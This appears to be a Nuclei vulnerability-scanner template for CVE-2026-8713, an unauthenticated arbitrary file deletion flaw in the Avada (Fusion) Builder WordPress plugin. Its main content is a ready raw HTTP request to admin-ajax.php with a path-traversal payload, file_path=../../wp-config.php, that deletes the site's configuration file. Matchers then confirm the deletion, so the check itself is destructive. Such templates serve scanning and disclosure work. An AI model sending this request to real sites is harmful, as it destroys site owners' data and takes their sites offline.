id: CVE-2026-8713
info:
  name: Avada (Fusion) Builder <= 3.15.3 - Unauthenticated Arbitrary File Deletion
  author: rool-machine
  severity: critical
  description: The Avada (Fusion) Builder plugin for WordPress is vulnerable to arbitrary file deletion due to insufficient file path validation in the maybe_delete_files function.
  reference:
    - https://www.wordfence.com/blog/2026/06/critical-unauthenticated-arbitrary-file-deletion-vulnerability-patched-in-avada-builder-wordpress-plugin/
  tags: cve,cve2026,wordpress,wp-plugin,avada,fusion-builder,file-deletion
http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=fusion_form_maybe_delete_files&file_path=../../wp-config.php
    matchers:
      - type: word
        words:
          - "success"
          - "file_deleted"
        condition: or
        part: body
